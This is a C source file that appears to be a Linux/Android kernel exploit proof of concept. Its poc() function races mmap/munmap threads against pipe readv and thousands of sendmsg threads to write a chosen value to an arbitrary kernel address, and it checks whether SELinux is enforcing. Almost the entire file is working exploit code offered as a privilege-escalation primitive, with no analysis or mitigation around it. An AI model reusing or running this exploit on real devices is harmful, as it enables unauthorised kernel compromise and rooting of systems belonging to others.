#define _GNU_SOURCE
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <linux/socket.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <signal.h>
#include <errno.h>
#include "log.h"

/*
selinux 512 100
*/

#define MMAP_START      (0x40000000)
#define MMAP_SIZE       (0x1000)
#define MMAP_BASE(i)    (MMAP_START + (i) * MMAP_SIZE)
//#define NR_MMAPS        (512)
#define NR_MMAPS        (1024)

#define NR_PIPES        (1)
#define MAX_RACE_SECS	(5)

//#define NR_SOCKS	(1000)
#define NR_SOCKS	(2048)

#define UDP_SERVER_PORT		(5105)

enum mmap_status_t {
	MMAP_MAPPED = 0,
	MMAP_UNMAPPED
};

struct mmap_info_t {
	size_t base;
	size_t len;
	void *                  vaddr;
	enum mmap_status_t status;
};

struct pipe_pair_t {
	int fd[2];
    int ok;
};

static size_t target_addr = 0x0;
static size_t target_size = 0x0;
int (*test_func_addr)();

static unsigned long kill_switch = 0;
static int retry = 0;

static struct mmap_info_t mmap_info[NR_MMAPS];
static pthread_t mmap_thread;
static struct iovec mmap_iov[NR_MMAPS];

static struct pipe_pair_t pipes[NR_PIPES];
static pthread_t pipe_read_threads[NR_PIPES];
static pthread_t pipe_write_threads[NR_PIPES];

static pthread_t sendmmsg_threads[NR_SOCKS];

static int server_sockfd;
static struct sockaddr_in sk_client;

static struct iovec msg_iovecs[NR_MMAPS];

static unsigned long pipe_buf[16] = {
	0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0,
};

static inline int init_sock(){
	int i;
	struct sockaddr_in server;

	server_sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (server_sockfd == -1) {
		LOGE("[-] <init_sock> socket failed");
		return -1;
	}

	server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("127.0.0.1");
	server.sin_port = htons(UDP_SERVER_PORT);
	memcpy(&sk_client, &server, sizeof(server));

	if (bind(server_sockfd, (struct sockaddr *)&server, sizeof(server)) == -1) {
		LOGE("[-] <init_sock> bind failed");
		return -1;
	}

	/* Also initialize client side iovecs here */
	for (i = 0; i < NR_MMAPS;) {
	    if ( (i % 256) == 0) {
		msg_iovecs[i].iov_base = (void *)MMAP_START;
		msg_iovecs[i].iov_len = 0;
		msg_iovecs[i + 1].iov_base = (void *)target_addr;
		msg_iovecs[i + 1].iov_len = target_size;
		i += 2;
		continue;

	    }
	    msg_iovecs[i].iov_base = (void *)MMAP_START;
	    msg_iovecs[i].iov_len = 0x1000;
	    i++;
	}

    return 0;
}

static inline int init_mmap(){
	int i;

	for (i = 0; i < NR_MMAPS; i++) {
		mmap_info[i].base = MMAP_BASE(i);
		mmap_info[i].len = MMAP_SIZE;
		mmap_info[i].vaddr = mmap(
		        (void *)mmap_info[i].base, mmap_info[i].len,
		        PROT_EXEC | PROT_READ | PROT_WRITE,
		        MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS,
		        -1, 0
		        );

		if (mmap_info[i].vaddr == (void *)-1) {
			LOGE("[-] <init_mmap> mmap failed");
			return -1;
		}

		mmap_iov[i].iov_base = mmap_info[i].vaddr;
		switch(i) {
		case 0:
			mmap_iov[i].iov_len = 0;
			break;
		case 1:
			mmap_iov[i].iov_len = 32;
			break;
		default:
			mmap_iov[i].iov_len = 8;
		}
	}

	return 0;
}

static inline int init_pipes(){
	int i;

	for (i = 0; i < NR_PIPES; i++) {
		if (pipe(pipes[i].fd) == -1) {
			LOGE("[-] <init_pipes> pipe failed");
			return -1;
		}
        
        //fcntl(pipes[i].fd[0], F_SETFL, O_NONBLOCK);
        //fcntl(pipes[i].fd[1], F_SETFL, O_NONBLOCK);
	}

	return 0;
}

void *sendmmsg_thread_func(void *p){
	int sockfd;
	struct msghdr msg; 
	int retval; 
    int i;

	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (sockfd == -1) {
		LOGE("[-] <sendmmsg_thread_func> socket client failed");
		pthread_exit(NULL);
	}

	if (connect(sockfd, (struct sockaddr *)&sk_client, sizeof(sk_client)) == -1) {
		LOGE("[-] <sendmmsg_thread_func> connect failed");
		perror("sendmmsg_thread_func> connect");
		//pthread_exit(NULL);
        goto SENDMMSG_THREAD_FUNC_EXIT;
	}

	msg.msg_name = NULL;
	msg.msg_namelen = 0;
	msg.msg_control = &msg_iovecs[0];
	msg.msg_controllen = NR_MMAPS * sizeof(struct iovec);
    msg.msg_iov = &msg_iovecs[0];
    msg.msg_iovlen = NR_MMAPS; 

	for(i=0;;i++) {
		if (kill_switch) { break; }
 
		retval = sendmsg(sockfd, &msg, 0); 
		if( -1 != retval){
        	LOGD("ret = %d, errno=%d, strerror=%s", retval, errno, strerror(errno));
        }
	}

SENDMMSG_THREAD_FUNC_EXIT:
	close(sockfd);

	pthread_exit(NULL);
}

void *mmap_thread_func(void *p){
	int i = 2;//;

	for(;; ) {
		if (kill_switch) { break; }
		if (i >= NR_MMAPS) { i -= NR_MMAPS; }

		munmap(mmap_info[i].vaddr, mmap_info[i].len);
		mmap_info[i].status = MMAP_UNMAPPED;

		mmap_info[i].vaddr = mmap(
		        (void *)mmap_info[i].base, mmap_info[i].len,
		        PROT_EXEC | PROT_READ | PROT_WRITE,
		        MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS,
		        -1, 0
		        );

		if (mmap_info[i].vaddr == (void *)-1) {
			LOGE("[-] <mmap_thread_func> mmap failed");
		}
        //usleep(5);
	}

	pthread_exit(NULL);
}

void case_mmap_change(){
    int i=2;
    
    munmap(mmap_info[i].vaddr, mmap_info[i].len);
    mmap_info[i].status = MMAP_UNMAPPED;

    mmap_info[i].vaddr = mmap(
            (void *)mmap_info[i].base, mmap_info[i].len,
            PROT_EXEC | PROT_READ | PROT_WRITE,
            MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS,
            -1, 0
            );

    if (mmap_info[i].vaddr == (void *)-1) {
        LOGE("[-] <mmap_thread_func> mmap failed");
    }
}

void *pipe_write_func(void *arg){
	int pipe_fd = (int)arg;
	ssize_t len;

	for (;;) {
		if (kill_switch) { break; }
		write(pipe_fd, pipe_buf, sizeof(pipe_buf));
	}

	LOGD("[+] <pipe_write_func> pipe_write_func quit");

	pthread_exit(NULL);
}

static inline int is_selinux_enforcing(){
	int fd;
	char c;

	fd = open("/sys/fs/selinux/enforce", O_RDONLY);
	if (fd == -1) {
		return 1;
	}

	read(fd, &c, 1);
	if (c == '0') {
		close(fd);
		return 0;
	}

	close(fd);
	return 1;
}

void *pipe_read_func(void *arg){
	int pipe_fd = (int)arg;
	ssize_t len;
	time_t t1, t2;
	int c = 0;
    int i;

	t1 = time(NULL);

	for(i=0;;i++) {
		if (kill_switch) { break; }  
        len = readv(pipe_fd, &mmap_iov[0], NR_MMAPS); 
		if (!test_func_addr()) {
			LOGD("[+] <pipe_read_func> *****test_func return 0*****");
			pthread_exit(NULL);
		}
		usleep(10);

		c++;
		if ((c & 0x1000) == 0x1000) {
			c = 0;
			t2 = time(NULL);
			if ((t2 - t1) >= MAX_RACE_SECS) {
				pthread_exit((void *)-1);
			}
		}
	}

	pthread_exit((void *)-1);
}

int create_sendmsg_threads(){
    int i;
	int rc;
	void *thread_retval;
    
	kill_switch = 0;
    for (i = 0; i < NR_SOCKS; i++) {
		rc = pthread_create(&sendmmsg_threads[i], NULL,
			sendmmsg_thread_func, NULL);

		if (rc) {
			LOGE("[-] <create_sendmsg_threads> sendmmsg_threads failed");

			return -1;
		} 
	}
    sleep(3); 
	kill_switch = 1;
	for (i = 0; i < NR_SOCKS; i++) {
		pthread_join(sendmmsg_threads[i], &thread_retval);
	}
	kill_switch = 0;
	sleep(1);
    
    return 0;
}

int create_mmap_thread(){
	int i;
	int rc;
    
    rc = pthread_create(&mmap_thread, NULL, mmap_thread_func, NULL);
	if (rc) {
		LOGE("[-] <create_sendmsg_threads> mmap_thread failed");
        return -1;
	}
    
    return 0;
}

int create_pipe_read_write(){
    int i;
    int rc;
	void *thread_retval;
    
    for (i = 0; i < NR_PIPES; i++) {
		rc = pthread_create(&pipe_write_threads[i], NULL,
		                    pipe_write_func, (void *)pipes[i].fd[1]);
		if (rc) {
			LOGD("[-] <create_pipe_read_write> create pipe_write_thread failed");
			return -1;
		}

		rc = pthread_create(&pipe_read_threads[i], NULL,
		                    pipe_read_func, (void *)pipes[i].fd[0]);
		if (rc) {
			LOGD("[-] <create_pipe_read_write> create pipe_read_thread failed");
			return -1;
		}
	}

	for (i = 0; i < NR_PIPES; i++) {
		LOGD("[+] <create_pipe_read_write> join read thread %d...", i);
		pthread_join(pipe_read_threads[i], &thread_retval);
		if (thread_retval == (void *)-1) {
			//retry = 1;
            retry++;
		}else{
            retry = 0;
        }
	}
	LOGD("[+] <create_pipe_read_write> done");
    return 0;
}

int close_pipe_read_write(){
    int i;
    for (i = 0; i < NR_PIPES; i++) {
		for(;;) {
			if (close(pipes[i].fd[0])) {
				LOGD("[-] <close_pipe_read_write> close write pipe failed");
				continue;
			}

			if (close(pipes[i].fd[1])) {
				LOGD("[-] <close_pipe_read_write> close read pipe failed");
				continue;
			}
			break;
		}
	}
	LOGD("[+] <close_pipe_read_write> pipe closed");
    return 0;
}

/* Note: adjust rlimit if needed for more allowed open fd */
int poc(size_t addr, int size, unsigned long value, int (*test_func)()){
	int i;
	int rc;
	void *thread_retval;
 
	target_addr = addr;  
    target_size = size;
    test_func_addr = test_func;
    
    for(i=0;i<sizeof(pipe_buf)/sizeof(pipe_buf[0]);i++){
        pipe_buf[i] = value;
    }

	if( -1 == init_sock() ){
        LOGE("[-] <poc> failed to init_sock");
        return -1;
    }
	if( -1 == init_mmap() ){
        LOGE("[-] <poc> failed to init_mmap");
        return -1;
    }

    signal(SIGPIPE, SIG_IGN);
	
    retry = 0;
/*
redo:
*/
	//LOGD("[+] <poc> ***********try once %d**********", retry);
	if( -1 == init_pipes() ){
        LOGE("[-] <poc> failed to init_pipes");
        return -1;
    }
    //LOGD("[+] <poc> success to init_pipes");
    
    if( -1 == create_sendmsg_threads() ){
        LOGE("[-] <poc> failed to create_sendmsg_threads");
        return -1;
    }
    //LOGD("[+] <poc> success to create_sendmsg_threads");
    
    kill_switch = 0;
    
	if( -1 == create_mmap_thread() ){
        LOGE("[-] <poc> failed to create_mmap_thread");
        return -1;
    }
    //LOGD("[+] <poc> success to create_mmap_thread");

    if( -1 == create_pipe_read_write() ){
        LOGE("[-] <poc> failed to create_pipe_read_write");
        return -1;
    }
    //LOGD("[+] <poc> success to create_pipe_read_write");

	kill_switch = 1;
    
	pthread_join(mmap_thread, &thread_retval);
    //LOGD("[+] <poc> success to join mmap_thread");
    
    if( -1 == close_pipe_read_write() ){
        LOGE("[-] <poc> failed to close_pipe_read_write");
        return -1;
    }
    //LOGD("[+] <poc> success to close_pipe_read_write");
    
    for (i = 0; i < NR_PIPES; i++) {
		LOGD("[+] <poc> join write thread %d...", i);
		pthread_join(pipe_write_threads[i], &thread_retval);
	}
    //LOGD("[+] <poc> success to join pipe_write_threads");
    
	LOGD("[+] <poc> done");

    /*
	if(retry && retry <= 10) {
		goto redo;
	}*/
    
    //善后
    close(server_sockfd);
    for (i = 0; i < NR_MMAPS; i++) {
		munmap( (void *)mmap_info[i].base, mmap_info[i].len );
    }

	return 0;
}
